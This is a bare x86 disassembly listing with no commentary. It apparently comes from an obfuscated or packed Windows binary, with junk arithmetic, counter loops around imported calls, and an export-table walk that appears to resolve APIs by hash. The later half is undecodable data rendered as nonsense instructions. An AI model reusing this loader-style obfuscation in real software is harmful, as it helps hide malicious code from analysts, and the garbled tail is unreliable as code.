  40504e:	xor    DWORD PTR ds:0x42b00c,0x3dbe
  405058:	push   DWORD PTR [ebp+0x8]
  40505b:	call   0x40c78f
  405060:	sbb    ecx,0x6495
  405066:	mov    DWORD PTR [ebp-0x14],eax
  405069:	or     DWORD PTR ds:0x42901c,ebx
  40506f:	mov    eax,DWORD PTR [ebp-0x4]
  405072:	mov    ecx,DWORD PTR [ebp-0x14]
  405075:	adc    DWORD PTR ds:0x42d00c,0x15e5
  40507f:	xor    eax,esi
  405081:	add    eax,edi
  405083:	mov    DWORD PTR ds:0x42b004,0x7edf
  40508d:	cmp    ecx,eax
  40508f:	mov    DWORD PTR ds:0x42d014,0x1e10
  405099:	je     0x40528b
  40509f:	mov    eax,DWORD PTR [ebp-0x14]
  4050a2:	mov    ecx,DWORD PTR ds:0x429010
  4050a8:	sbb    DWORD PTR ds:0x42c00c,ecx
  4050ae:	mov    eax,DWORD PTR [eax+0x18]
  4050b1:	mov    DWORD PTR [ebp-0x2c],eax
  4050b4:	add    ecx,ecx
  4050b6:	mov    eax,DWORD PTR [ebp-0x14]
  4050b9:	sbb    DWORD PTR ds:0x42c01c,0x4c1
  4050c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4050c6:	xor    DWORD PTR ds:0x42b000,0x3fa3
  4050d0:	add    ecx,DWORD PTR [eax+0x20]
  4050d3:	xor    eax,0x40df
  4050d8:	mov    DWORD PTR [ebp-0x34],ecx
  4050db:	or     ecx,eax
  4050dd:	mov    eax,DWORD PTR [ebp-0x14]
  4050e0:	xor    DWORD PTR ds:0x429008,ecx
  4050e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4050e9:	and    DWORD PTR ds:0x42a008,0x42d014
  4050f3:	add    ecx,DWORD PTR [eax+0x24]
  4050f6:	mov    DWORD PTR [ebp-0x3c],ecx
  4050f9:	movzx  eax,BYTE PTR ds:0x42c000
  405100:	sbb    DWORD PTR ds:0x429010,eax
  405106:	mov    eax,DWORD PTR [ebp-0x14]
  405109:	mov    DWORD PTR ds:0x42d004,0x14
  405113:	cmp    DWORD PTR ds:0x42d004,0x0
  40511a:	je     0x405176
  405120:	cmp    DWORD PTR ds:0x42d004,0x9
  405127:	jne    0x405142
  40512d:	push   0x42e0f9
  405132:	push   0x42e0c7
  405137:	push   0x400000
  40513c:	call   DWORD PTR ds:0x42e9c7
  405142:	cmp    DWORD PTR ds:0x42d004,0xa
  405149:	jne    0x40515c
  40514f:	mov    ecx,DWORD PTR ds:0x42d004
  405155:	dec    ecx
  405156:	mov    DWORD PTR ds:0x42d004,ecx
  40515c:	xor    ecx,ecx
  40515e:	or     ecx,DWORD PTR ds:0x42d004
  405164:	dec    ecx
  405165:	mov    DWORD PTR ds:0x42d004,ecx
  40516b:	jmp    0x405113
  405170:	inc    DWORD PTR ds:0x42b00c
  405176:	mov    ecx,DWORD PTR [ebp+0x8]
  405179:	add    ecx,DWORD PTR [eax+0x1c]
  40517c:	mov    DWORD PTR [ebp-0x14],ecx
  40517f:	jmp    0x405253
  405184:	sub    DWORD PTR ds:0x42c018,ebx
  40518a:	mov    eax,DWORD PTR [ebp-0x34]
  40518d:	mov    ecx,DWORD PTR [ebp+0x8]
  405190:	sbb    DWORD PTR ds:0x42a014,0x429000
  40519a:	add    ecx,DWORD PTR [eax+ebx*4]
  40519d:	and    DWORD PTR ds:0x42d00c,0x0
  4051a7:	jmp    0x4051b7
  4051ac:	mov    eax,ds:0x42d00c
  4051b1:	inc    eax
  4051b2:	mov    ds:0x42d00c,eax
  4051b7:	cmp    DWORD PTR ds:0x42d00c,0x1b
  4051be:	jae    0x405206
  4051c4:	cmp    DWORD PTR ds:0x42d00c,0xd
  4051cb:	jne    0x4051dc
  4051d1:	push   0x42e0b3
  4051d6:	call   DWORD PTR ds:0x42e9cb
  4051dc:	cmp    DWORD PTR ds:0x42d00c,0xc
  4051e3:	jne    0x4051f7
  4051e9:	xor    eax,eax
  4051eb:	xor    eax,DWORD PTR ds:0x42d00c
  4051f1:	inc    eax
  4051f2:	mov    ds:0x42d00c,eax
  4051f7:	jmp    0x4051ac
  4051fc:	xor    DWORD PTR ds:0x42b010,0x429024
  405206:	mov    DWORD PTR [ebp-0x30],ecx
  405209:	mov    eax,DWORD PTR [ebp-0x4]
  40520c:	mov    ecx,DWORD PTR [ebp-0x30]
  40520f:	xor    eax,esi
  405211:	add    eax,edi
  405213:	cmp    ecx,eax
  405215:	je     0x405253
  40521b:	jmp    0x405244
  405220:	mov    eax,DWORD PTR [ebp-0x4]
  405223:	mov    ecx,DWORD PTR [ebp-0x8]
  405226:	xor    eax,esi
  405228:	add    eax,edi
  40522a:	cmp    ecx,eax
  40522c:	mov    eax,DWORD PTR [ebp-0x4]
  40522f:	je     0x40528e
  405235:	mov    ecx,DWORD PTR [ebp-0x38]
  405238:	xor    eax,esi
  40523a:	add    eax,edi
  40523c:	cmp    ecx,eax
  40523e:	je     0x405297
  405244:	lea    eax,[ebp-0x8]
  405247:	push   eax
  405248:	push   DWORD PTR [ebp-0x30]
  40524b:	push   DWORD PTR [ebp+0xc]
  40524e:	call   0x40ca0a
  405253:	mov    eax,DWORD PTR [ebp-0x4]
  405256:	mov    ecx,DWORD PTR [ebp-0x8]
  405259:	xor    eax,esi
  40525b:	add    eax,edi
  40525d:	cmp    ecx,eax
  40525f:	je     0x40527a
  405265:	mov    eax,DWORD PTR [ebp-0x3c]
  405268:	movzx  eax,WORD PTR [eax+ebx*2]
  40526c:	mov    ecx,DWORD PTR [ebp-0x14]
  40526f:	mov    eax,DWORD PTR [ecx+eax*4]
  405272:	mov    DWORD PTR [ebp-0x40],eax
  405275:	jmp    0x405220
  40527a:	mov    eax,DWORD PTR [ebp-0xc]
  40527d:	xor    eax,esi
  40527f:	lea    ebx,[ebx+eax*1+0x3272e0]
  405286:	jmp    0x402be0
  40528b:	mov    eax,DWORD PTR [ebp-0x4]
  40528e:	xor    eax,esi
  405290:	add    eax,edi
  405292:	jmp    0x4053b4
  405297:	mov    eax,DWORD PTR [ebp-0x40]
  40529a:	add    eax,DWORD PTR [ebp+0x8]
  40529d:	mov    DWORD PTR [ebp-0x18],eax
  4052a0:	mov    eax,DWORD PTR [ebp-0x1c]
  4052a3:	test   eax,eax
  4052a5:	je     0x40533f
  4052ab:	mov    DWORD PTR [ebp-0x28],0x0
  4052b2:	push   0x3
  4052b4:	xor    edx,edx
  4052b6:	pop    edx
  4052b7:	add    edx,0x8
  4052ba:	push   edx
  4052bb:	pop    ecx
  4052bc:	push   0x6
  4052be:	dec    ecx
  4052bf:	pop    ebx
  4052c0:	dec    ebx
  4052c1:	xchg   ebx,ecx
  4052c3:	sub    ebx,ecx
  4052c5:	xchg   ebx,ecx
  4052c7:	dec    ecx
  4052c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052cb:	imul   eax,ecx
  4052ce:	sub    esp,eax
  4052d0:	mov    DWORD PTR [ebp-0x28],esp
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x405318
  4052df:	mov    ecx,DWORD PTR [ebp-0xc]
  4052e2:	mov    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    edx,DWORD PTR [ebp+0x14]
  4052e8:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052ec:	xor    ecx,esi
  4052ee:	add    ecx,edi
  4052f0:	xor    edx,edx
  4052f2:	div    ecx
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	xor    ecx,esi
  4052f9:	lea    eax,[ecx+eax*1+0x3272e0]
  405300:	mov    ecx,DWORD PTR [ebp+0x8]
  405303:	mov    edx,DWORD PTR [ebp-0x28]
  405306:	mov    DWORD PTR [edx+ecx*4],eax
  405309:	mov    eax,DWORD PTR [ebp-0xc]
  40530c:	mov    ecx,DWORD PTR [ebp+0x8]
  40530f:	xor    eax,esi
  405311:	lea    eax,[eax+ecx*1+0x3272e0]
  405318:	mov    DWORD PTR [ebp+0x8],eax
  40531b:	mov    eax,DWORD PTR [ebp-0xc]
  40531e:	mov    ecx,DWORD PTR [ebp+0x14]
  405321:	xor    eax,esi
  405323:	add    eax,edi
  405325:	imul   eax,DWORD PTR [ecx]
  405328:	mov    ecx,DWORD PTR [ebp-0x4]
  40532b:	mov    edx,DWORD PTR [ebp+0x8]
  40532e:	xor    ecx,esi
  405330:	lea    ecx,[ecx+edx*1+0x3272e0]
  405337:	cmp    ecx,eax
  405339:	jne    0x4052df
  40533f:	mov    eax,DWORD PTR [ebp-0x4]
  405342:	xor    eax,esi
  405344:	add    eax,edi
  405346:	mov    DWORD PTR [ebp-0x10],eax
  405349:	mov    ebx,0x65655
  40534e:	add    ebx,0x3234
  405354:	xchg   ebx,esi
  405356:	xor    ebx,ebx
  405358:	push   esi
  405359:	mov    esi,ebx
  40535b:	pop    ebx
  40535c:	mov    edx,esi
  40535e:	add    ebx,0x1002
  405364:	lea    eax,[ebp-0x18]
  405367:	add    edx,eax
  405369:	add    edx,0x5
  40536c:	push   edx
  40536d:	inc    esi
  40536e:	pop    ecx
  40536f:	dec    ecx
  405370:	xchg   ecx,eax
  405371:	dec    eax
  405372:	xchg   ecx,eax
  405373:	dec    ecx
  405374:	xchg   ecx,edx
  405376:	dec    edx
  405377:	push   edx
  405378:	mov    edx,ebx
  40537a:	pop    ebx
  40537b:	dec    ebx
  40537c:	call   DWORD PTR [ebx]
  40537e:	cmp    DWORD PTR [ebp+0x10],esi
  405381:	je     0x4053a0
  405387:	xchg   edx,eax
  405388:	push   0xb
  40538a:	pop    ecx
  40538b:	push   0x4
  40538d:	pop    ebx
  40538e:	inc    ebx
  40538f:	xchg   ebx,ecx
  405391:	sub    ebx,ecx
  405393:	xchg   ebx,ecx
  405395:	dec    ecx
  405396:	dec    ecx
  405397:	mov    eax,DWORD PTR [ebp-0x1c]
  40539a:	imul   eax,ecx
  40539d:	add    esp,eax
  40539f:	xchg   edx,eax
  4053a0:	push   eax
  4053a1:	xor    ebx,ebx
  4053a3:	mov    edx,esp
  4053a5:	dec    edx
  4053a6:	inc    ebx
  4053a7:	add    ebx,DWORD PTR [edx+ebx*1]
  4053aa:	dec    ebx
  4053ab:	xor    edx,edx
  4053ad:	add    DWORD PTR [ebp-0x10],ebx
  4053b0:	pop    ebx
  4053b1:	mov    eax,DWORD PTR [ebp-0x10]
  4053b4:	pop    edi
  4053b5:	pop    esi
  4053b6:	pop    ebx
  4053b7:	leave  
  4053b8:	ret    0x10
  4053bb:	push   ebp
  4053bc:	mov    ebp,esp
  4053be:	sub    esp,0x7c
  4053c1:	mov    eax,ds:0x42a000
  4053c6:	xor    eax,DWORD PTR ds:0x42c014
  4053cc:	mov    ds:0x42a000,eax
  4053d1:	push   esi
  4053d2:	and    DWORD PTR ds:0x42a004,0x0
  4053dc:	jmp    0x4053f0
  4053e1:	xor    esi,esi
  4053e3:	or     esi,DWORD PTR ds:0x42a004
  4053e9:	inc    esi
  4053ea:	mov    DWORD PTR ds:0x42a004,esi
  4053f0:	cmp    DWORD PTR ds:0x42a004,0x18
  4053f7:	jae    0x4054e8
  4053fd:	cmp    DWORD PTR ds:0x42a004,0x6
  405404:	jne    0x405415
  40540a:	push   0x429028
  40540f:	call   DWORD PTR ds:0x42e9d3
  405415:	cmp    DWORD PTR ds:0x42a004,0x5
  40541c:	jne    0x405431
  405422:	xor    esi,esi
  405424:	or     esi,DWORD PTR ds:0x42a004
  40542a:	inc    esi
  40542b:	mov    DWORD PTR ds:0x42a004,esi
  405431:	jmp    0x4053e1
  405436:	and    DWORD PTR ds:0x42a014,0x0
  405440:	jmp    0x405454
  405445:	xor    esi,esi
  405447:	or     esi,DWORD PTR ds:0x42a014
  40544d:	inc    esi
  40544e:	mov    DWORD PTR ds:0x42a014,esi
  405454:	cmp    DWORD PTR ds:0x42a014,0x19
  40545b:	jae    0x4054e8
  405461:	cmp    DWORD PTR ds:0x42a014,0xf
  405468:	jne    0x405483
  40546e:	push   0x42d01c
  405473:	push   0x42a00c
  405478:	push   0x42d010
  40547d:	call   DWORD PTR ds:0x42e993
  405483:	cmp    DWORD PTR ds:0x42a014,0xe
  40548a:	jne    0x40549d
  405490:	mov    esi,DWORD PTR ds:0x42a014
  405496:	inc    esi
  405497:	mov    DWORD PTR ds:0x42a014,esi
  40549d:	jmp    0x405445
  4054a2:	mov    DWORD PTR ds:0x42c010,0x19
  4054ac:	cmp    DWORD PTR ds:0x42c010,0x0
  4054b3:	je     0x4054e8
  4054b9:	cmp    DWORD PTR ds:0x42c010,0x1e
  4054c0:	jne    0x4054d6
  4054c6:	push   0x0
  4054c8:	push   0x13e0
  4054cd:	push   DWORD PTR [ebp-0x14]
  4054d0:	call   DWORD PTR ds:0x42e997
  4054d6:	mov    esi,DWORD PTR ds:0x42c010
  4054dc:	dec    esi
  4054dd:	mov    DWORD PTR ds:0x42c010,esi
  4054e3:	jmp    0x4054ac
  4054e8:	push   edi
  4054e9:	adc    DWORD PTR ds:0x42901c,edx
  4054ef:	mov    eax,ds:0x42e313
  4054f4:	mov    esi,DWORD PTR ds:0x42c01c
  4054fa:	and    DWORD PTR ds:0x42a00c,esi
  405500:	mov    DWORD PTR [ebp-0x24],eax
  405503:	mov    eax,ds:0x42e41f
  405508:	mov    DWORD PTR [ebp-0x34],eax
  40550b:	mov    DWORD PTR ds:0x42b008,0x1b
  405515:	cmp    DWORD PTR ds:0x42b008,0x0
  40551c:	je     0x405564
  405522:	cmp    DWORD PTR ds:0x42b008,0x26
  405529:	jne    0x405554
  40552f:	push   0x5039
  405534:	push   DWORD PTR [ebp-0x20]
  405537:	push   0x42d010
  40553c:	push   0x88e6
  405541:	push   DWORD PTR [ebp-0x10]
  405544:	push   0x8f04
  405549:	push   0x8b34
  40554e:	call   DWORD PTR ds:0x42e99f
  405554:	mov    eax,ds:0x42b008
  405559:	dec    eax
  40555a:	mov    ds:0x42b008,eax
  40555f:	jmp    0x405515
  405564:	and    DWORD PTR [ebp-0x30],0x0
  405568:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40556f:	add    eax,eax
  405571:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  405578:	add    DWORD PTR ds:0x42c014,edi
  40557e:	mov    eax,DWORD PTR [ebp-0x10]
  405581:	and    DWORD PTR ds:0x42d014,0x0
  40558b:	mov    esi,DWORD PTR ds:0x42d014
  405591:	inc    esi
  405592:	mov    DWORD PTR ds:0x42d014,esi
  405598:	cmp    DWORD PTR ds:0x42d014,0x5
  40559f:	jne    0x4055c0
  4055a5:	push   0x42c004
  4055aa:	push   DWORD PTR [ebp-0x20]
  4055ad:	push   0x42e0c7
  4055b2:	push   DWORD PTR [ebp-0x24]
  4055b5:	push   0x31c8
  4055ba:	call   DWORD PTR ds:0x42e9a3
  4055c0:	cmp    DWORD PTR ds:0x42d014,0x4
  4055c7:	jne    0x4055dc
  4055cd:	xor    esi,esi
  4055cf:	xor    esi,DWORD PTR ds:0x42d014
  4055d5:	inc    esi
  4055d6:	mov    DWORD PTR ds:0x42d014,esi
  4055dc:	cmp    DWORD PTR ds:0x42d014,0x1c
  4055e3:	jb     0x40558b
  4055e9:	and    DWORD PTR ds:0x42c004,0x0
  4055f3:	xor    ecx,ecx
  4055f5:	xor    ecx,DWORD PTR ds:0x42c004
  4055fb:	inc    ecx
  4055fc:	mov    DWORD PTR ds:0x42c004,ecx
  405602:	cmp    DWORD PTR ds:0x42c004,0x28
  405609:	jne    0x40561a
  40560f:	push   0x42d010
  405614:	call   DWORD PTR ds:0x42e9ab
  40561a:	cmp    DWORD PTR ds:0x42c004,0x18
  405621:	jb     0x4055f3
  405627:	and    DWORD PTR ds:0x42c018,edx
  40562d:	mov    ecx,DWORD PTR [ebp-0x10]
  405630:	sub    eax,ecx
  405632:	mov    DWORD PTR [ebp-0x10],eax
  405635:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  40563c:	mov    eax,DWORD PTR [ebp-0x18]
  40563f:	mov    ecx,DWORD PTR [ebp-0x18]
  405642:	sub    eax,ecx
  405644:	mov    DWORD PTR [ebp-0x18],eax
  405647:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  40564e:	jmp    0x4079f8
  405653:	neg    DWORD PTR [edi+0x51]
  405656:	pop    ds
  405657:	adc    edi,esi
  405659:	div    DWORD PTR [edi]
  40565b:	jge    0x40560a
  40565d:	aam    0xe9
  40565f:	or     esi,ebx
  405661:	or     DWORD PTR [edi],0x7a7a5f30
  405667:	in     eax,0x5f
  405669:	jp     0x4056e5
  40566b:	inc    ebx
  40566c:	mov    BYTE PTR [esp+edi*1-0x522c5e48],bl
  405673:	mov    bh,0x2
  405675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405676:	push   cs
  405677:	dec    edi
  405678:	into   
  405679:	mov    ds:0x89928f1b,eax
  40567e:	sbb    al,0x3e
  405680:	jns    0x4056ce
  405682:	shr    DWORD PTR [eax+eax*8],cl
  405685:	xchg   ebp,eax
  405686:	adc    BYTE PTR [edi+edi*2-0x71],bh
  40568a:	push   ebx
  40568b:	cwde   
  40568c:	mov    ebp,0x41925374
  405691:	mov    ebx,DWORD PTR [ecx+0x4f]
  405694:	shl    DWORD PTR [edx+0x72],0xd7
  405698:	add    edx,ecx
  40569a:	xchg   edx,eax
  40569b:	xchg   edx,eax
  40569c:	aad    0x93
  40569e:	inc    ebp
  40569f:	adc    BYTE PTR [ebp+ecx*1+0x4d],bl
  4056a3:	fcos   
  4056a5:	inc    ebp
  4056a6:	mov    ds:0x41c6ad6f,eax
  4056ab:	dec    ebx
  4056ac:	fisub  DWORD PTR [esp+ecx*8-0x2]
  4056b0:	data16 lahf 
  4056b2:	xchg   ecx,eax
  4056b3:	jae    0x405682
  4056b5:	inc    esp
  4056b6:	mov    bl,ch
  4056b8:	cmp    DWORD PTR [edx+eiz*2-0xedf2caf],0x68118173
  4056c3:	dec    edx
  4056c4:	xor    BYTE PTR [edi-0x56d33aff],dl
  4056ca:	push   eax
  4056cb:	rcr    cl,cl
  4056cd:	jns    0x4056bd
  4056cf:	pop    ecx
  4056d0:	push   esi
  4056d1:	test   eax,0xab2b88e
  4056d6:	pusha  
  4056d7:	mov    ecx,esi
  4056d9:	pop    eax
  4056da:	mov    ebx,0xcb195643
  4056df:	std    
  4056e0:	outs   dx,BYTE PTR ds:[esi]
  4056e1:	std    
  4056e2:	mov    esp,0xacaff060
  4056e7:	fst    QWORD PTR ds:[eax+0x3b9d99c6]
  4056ee:	pop    ss
  4056ef:	neg    BYTE PTR [edx-0x504dc844]
  4056f5:	push   eax
  4056f6:	stos   DWORD PTR es:[edi],eax
  4056f7:	cli    
  4056f8:	std    
  4056f9:	(bad)  [esi-0x2]
  4056fc:	repz mov ah,0xfe
  4056ff:	pop    esp
  405700:	fs cwde 
  405702:	lods   eax,DWORD PTR ds:[esi]
  405703:	mov    dl,0x11
  405705:	sar    edi,0x1
  405708:	loope  0x4056cc
  40570a:	inc    ebx
  40570b:	xchg   ecx,eax
  40570c:	xchg   ebp,eax
  40570d:	cmp    eax,0xd60d14de
  405712:	inc    ebx
  405713:	outs   dx,DWORD PTR ds:[esi]
  405714:	(bad)  
  405715:	call   0xa7c6823f
  40571a:	dec    ecx
  40571b:	jo     0x40572a
  40571d:	xchg   edx,eax
  40571e:	push   es
  40571f:	jbe    0x405796
  405721:	aaa    
  405722:	ins    DWORD PTR es:[edi],dx
  405723:	mov    esi,0xc0b1368d
  405728:	mov    DWORD PTR [edx+0x49],edi
  40572b:	cs xor eax,0xfac5feb4
  405731:	sub    ax,0x1efe
  405735:	xor    al,cl
  405737:	cmp    al,0xf5
  405739:	jne    0x40575e
  40573b:	shr    DWORD PTR [esi+0x2c52d01f],1
  405741:	inc    ebx
  405742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405743:	cmp    al,0xb3
  405745:	sbb    ebx,esi
  405747:	jle    0x4056d0
  405749:	cmp    al,0xe
  40574b:	add    BYTE PTR [eax],0x84
  40574e:	mov    dl,0x35
  405750:	repnz xchg edi,eax
  405752:	cmp    DWORD PTR [edi],0x71093cae
  405758:	retf   0x9c0c
  40575b:	popf   
  40575c:	ins    BYTE PTR es:[edi],dx
  40575d:	mov    eax,0x847f782b
  405762:	push   eax
  405763:	arpl   WORD PTR ds:0x383fdb0a,dx
  405769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40576a:	push   edi
  40576b:	cs out 0xe1,al
  40576e:	cmp    eax,0x8f086ed2
  405773:	aas    
  405774:	int    0xbf
  405776:	(bad)  
  405777:	out    dx,al
  405778:	call   0x61d6:0x54ddafcc
  40577f:	(bad)  
  405780:	popf   
  405781:	into   
  405782:	jnp    0x405782
  405784:	mov    esp,0x5771983e
  405789:	cmp    eax,0x39b6ec84
  40578e:	xchg   DWORD PTR [ebx-0x3e],edx
  405791:	clc    
  405792:	mov    esp,0x9b4dca16
  405797:	add    BYTE PTR [ecx+0x2f],0xa2
  40579b:	dec    ebp
  40579c:	xchg   ebp,eax
  40579d:	outs   dx,DWORD PTR ds:[esi]
  40579e:	adc    al,BYTE PTR [edi-0x56064d7f]
  4057a4:	mov    ebx,0x1c773c97
  4057a9:	adc    bl,cl
  4057ab:	push   DWORD PTR [ecx+0x5]
  4057ae:	fwait
  4057af:	data16 in al,0x26
  4057b2:	mov    esp,0x494e5008
  4057b7:	cmp    BYTE PTR [edx],ah
  4057b9:	sbb    ebx,DWORD PTR [edi-0x52]
  4057bc:	or     DWORD PTR [edx+0x3b],esi
  4057bf:	inc    ebx
  4057c0:	adc    DWORD PTR [esp+esi*4-0x7d9e0ae8],edx
  4057c7:	mov    WORD PTR [ebp+0x17],?
  4057ca:	push   eax
  4057cb:	call   0xd41833e4
  4057d0:	sar    DWORD PTR [esp+ecx*1+0x423678c3],cl
  4057d7:	int3   
  4057d8:	fdivrp st(1),st
  4057da:	jb     0x40580b
  4057dc:	pop    esp
  4057dd:	inc    eax
  4057de:	out    dx,eax
  4057df:	(bad)  
  4057e0:	mov    al,0x46
  4057e2:	jne    0x40576f
  4057e4:	sbb    bh,bl
  4057e6:	fwait
  4057e7:	popa   
  4057e8:	ss jae 0x4057bc
  4057eb:	loop   0x4057cc
  4057ed:	out    0x8b,eax
  4057ef:	(bad)  
  4057f0:	sar    ebx,cl
  4057f2:	xchg   ebp,eax
  4057f3:	les    esp,FWORD PTR [ebx]
  4057f5:	aad    0x31
  4057f7:	or     ch,BYTE PTR [ecx-0x1a19f01f]
  4057fd:	xchg   ecx,eax
  4057fe:	cmc    
  4057ff:	xor    cl,al
  405801:	sbb    DWORD PTR [esi+0x1794da2c],0xe619bddc
  40580b:	and    bh,bh
  40580d:	adc    eax,0xec7193b4
  405812:	pusha  
  405813:	sbb    esi,DWORD PTR [edi+ecx*8]
  405816:	int    0x89
  405818:	das    
  405819:	xchg   ebx,eax
  40581a:	add    dh,BYTE PTR ds:0x6c4da1dc
  405820:	sub    al,ah
  405822:	or     dh,ch
  405824:	jns    0x40589a
  405826:	xor    al,0xfa
  405828:	pop    eax
  405829:	add    DWORD PTR ds:0x44aa055c,0x3b
  405830:	out    0x4a,eax
  405832:	sbb    BYTE PTR ds:0xd139ccf3,cl
  405838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405839:	xchg   esp,eax
  40583a:	aas    
  40583b:	stos   DWORD PTR es:[edi],eax
  40583c:	or     BYTE PTR [edi-0x60d92a23],bl
  405842:	stc    
  405843:	stos   DWORD PTR es:[edi],eax
  405844:	dec    eax
  405845:	fld    st(2)
  405847:	sbb    al,0x20
  405849:	nop    eax
  40584c:	push   0x3d
  40584e:	addr16 xchg esp,eax
  405850:	xor    BYTE PTR ds:0x53045502,0xfe
  405857:	neg    BYTE PTR [ebx]
  405859:	mov    WORD PTR [eax],?
  40585b:	sahf   
  40585c:	mov    al,0xe1
  40585e:	fwait
  40585f:	jb     0x405847
  405861:	dec    edi
  405862:	push   es
  405863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405864:	cmc    
  405865:	rcr    ah,1
  405867:	jns    0x405808
  405869:	outs   dx,DWORD PTR ds:[esi]
  40586a:	fstp   DWORD PTR [eax+ecx*2-0x5c]
  40586e:	(bad)  
  40586f:	jno    0x4058f0
  405871:	pop    ebp
  405872:	in     al,dx
  405873:	cmp    edx,DWORD PTR [ebx]
  405875:	push   dx
  405877:	dec    ecx
  405878:	pop    ds
  405879:	fst    QWORD PTR [eax]
  40587b:	imul   esi,DWORD PTR [esp+ebx*1-0x2e6023ae],0xffffffc8
  405883:	inc    ebx
  405884:	or     eax,0x34603384
  405889:	aaa    
  40588a:	pop    edi
  40588b:	retf   
  40588c:	cmovbe esp,DWORD PTR [esi+edi*2-0x4]
  405891:	lock icebp 
  405893:	shr    DWORD PTR [esi+esi*4-0x62bf038],1
  40589a:	xchg   ch,dl
  40589c:	jne    0x4058ba
  40589e:	sbb    al,0x4c
  4058a0:	fwait
  4058a1:	inc    esi
  4058a2:	add    DWORD PTR [edx+0x39],edi
  4058a5:	mov    ds:0x29b2bf31,al
  4058aa:	adc    eax,0x609f16f
  4058af:	popf   
  4058b0:	cmp    BYTE PTR [ecx],cl
  4058b2:	push   cs
  4058b3:	dec    ebx
  4058b4:	dec    eax
  4058b5:	iret   
  4058b6:	mov    ds:0x64ecad43,al
  4058bb:	adc    DWORD PTR [edx],esi
  4058bd:	lds    esi,FWORD PTR [ebx-0x3293e529]
  4058c3:	enter  0x7dfa,0xcd
  4058c7:	and    edi,edi
  4058c9:	add    cl,bh
  4058cb:	push   0x3a270087
  4058d0:	mov    ah,0xe2
  4058d2:	sahf   
  4058d3:	aad    0xdb
  4058d5:	test   DWORD PTR [eax],0xe54001d8
  4058db:	and    DWORD PTR [ebx+0x23d06690],edx
  4058e1:	out    dx,eax
  4058e2:	jb     0x4058a2
  4058e4:	sahf   
  4058e5:	jmp    0xcecf5387
  4058ea:	push   ebp
  4058eb:	mov    al,BYTE PTR [edx-0x37fc12ac]
  4058f1:	adc    ecx,DWORD PTR [edx+ebx*2]
  4058f4:	cs (bad) 
  4058f6:	pop    esp
  4058f7:	adc    al,0xb5
  4058f9:	cmp    DWORD PTR [ebp-0x2d],eax
  4058fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058fd:	in     al,dx
  4058fe:	xchg   ecx,eax
  4058ff:	shl    DWORD PTR [edx],0xd6
  405902:	das    
  405903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405904:	test   eax,0x92e0662c
  405909:	and    esp,ebp
  40590b:	mov    al,0x4
  40590d:	sub    al,0xf3
  40590f:	lods   al,BYTE PTR ds:[esi]
  405910:	xchg   ah,al
  405912:	mov    edi,0xcf3d38f
  405917:	(bad)  
  405918:	jg     0x4058d2
  40591a:	or     dl,BYTE PTR [ebx+ebx*4]
  40591d:	sub    ah,bl
  40591f:	call   0x16c1bb1b
  405924:	daa    
  405925:	scas   al,BYTE PTR es:[edi]
  405926:	mov    ah,0x40
  405928:	mov    bl,0xc8
  40592a:	xor    eax,0x8cd42a84
  40592f:	repz cmp bh,BYTE PTR [ecx+0x33]
  405933:	adc    BYTE PTR [ebp+eiz*2-0x1a],0xeb
  405938:	cli    
  405939:	and    DWORD PTR [edi-0x55e4c001],esi
  40593f:	or     dh,BYTE PTR [edx+0x6fe31fea]
  405945:	loope  0x405967
  405947:	push   0x18c89b6e
  40594c:	mov    ebp,0xb6f3e78
  405951:	jb     0x40593d
  405953:	jge    0x40592b
  405955:	cld    
  405956:	enter  0xdebe,0x7c
  40595a:	sub    ch,ah
  40595c:	dec    esi
  40595d:	dec    ebp
  40595e:	in     eax,dx
  40595f:	xor    DWORD PTR [ebp-0x40778c95],eax
  405965:	and    al,0xc7
  405967:	inc    ebp
  405968:	cmp    ebp,DWORD PTR [esi+0x7623c09f]
  40596e:	cs jp  0x405967
  405971:	(bad)  
  405972:	(bad)  
  405973:	call   0x9db9b7fa
  405978:	sahf   
  405979:	rcr    dl,1
  40597b:	lods   al,BYTE PTR ds:[esi]
  40597c:	jecxz  0x405949
  40597e:	outs   dx,BYTE PTR ds:[esi]
  40597f:	push   0xbda0f496
  405984:	push   edi
  405985:	inc    DWORD PTR [ecx]
  405987:	nop
  405988:	daa    
  405989:	bnd call 0xa8b3e086
  40598f:	(bad)  
  405990:	adc    eax,0xdf07379
  405995:	push   esi
  405996:	cmp    eax,0xccb49371
  40599b:	test   DWORD PTR [edx+0x28],0xf59b05dc
  4059a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a3:	pop    ebp
  4059a4:	in     eax,0x5
  4059a6:	add    al,BYTE PTR ss:[eax]
  4059a9:	(bad)  
  4059aa:	jnp    0x405a09
  4059ac:	aad    0xce
  4059ae:	(bad)  
  4059af:	(bad)  
  4059b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059b2:	jle    0x405a28
  4059b4:	addr16 jno 0x4059ac
  4059b7:	outs   dx,DWORD PTR fs:[esi]
  4059b9:	repnz pop edx
  4059bb:	pop    ebp
  4059bc:	pop    ebx
  4059bd:	mov    dh,0x6b
  4059bf:	and    esp,ebx
  4059c1:	push   es
  4059c2:	cmp    bh,BYTE PTR [edi+0x7afc572b]
  4059c8:	iret   
  4059c9:	push   esi
  4059ca:	push   edx
  4059cb:	bts    DWORD PTR [ebx],ecx
  4059ce:	push   ss
  4059cf:	inc    ecx
  4059d0:	mov    edx,0xd0432c4
  4059d5:	inc    esi
  4059d6:	aaa    
  4059d7:	mov    BYTE PTR [ebp-0x4c],0x8e
